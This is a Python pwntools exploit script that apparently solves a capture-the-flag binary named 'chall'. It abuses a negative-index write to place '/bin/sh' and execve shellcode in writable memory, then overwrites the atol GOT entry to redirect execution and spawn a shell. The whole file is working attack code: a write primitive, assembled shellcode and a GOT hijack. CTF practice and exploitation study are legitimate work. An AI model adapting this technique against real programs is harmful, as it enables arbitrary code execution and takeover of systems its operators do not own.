"""
  1 i := rbp-0x54
  2 *buffer := rbp-0x50
  3 v := rbp-0x48
  4 *x[0] := rbp-0x40
"""
from pwn import *

context.arch='amd64'
context.log_level = "DEBUG"
elf = ELF("./chall")
p = process("./chall")


gdb.attach(p, """
 b *0x400826
 handle SIGALRM ignore
 continue
""")


bss = 0x0601080
payload = 0x0601100
atol_got = 0x601040

def writeBuf( addr, value ):
  ad_diff = 0x8
  p.sendlineafter("index: ", "-2" )
  p.sendlineafter("value: ", str(addr-ad_diff) )
  
  p.sendlineafter("index: ", "0" )
  p.sendlineafter("value: ", b'a'*ad_diff+value )

shellcode = asm('\n'.join([
  'mov rdi, %x'%bss,
  'xor rsi, rsi',
  'xor rdx, rdx',
  'xor eax, eax',
  'mov al, 0x3b',
  'syscall'
]) )

info( "shellcode size :" + size(shellcode) )

writeBuf( bss, b"/bin/sh\0" )
input()
writeBuf( payload, shellcode )

#p.interactive()
p.sendlineafter("index: ", "-2" )
p.sendlineafter("value: ", str(atol_got) )
p.sendlineafter("index: ", p64( payload ) )
p.sendlineafter("value: ", p64( payload ) )

#writeBuf( atol_got, p64(payload) )

p.interactive()
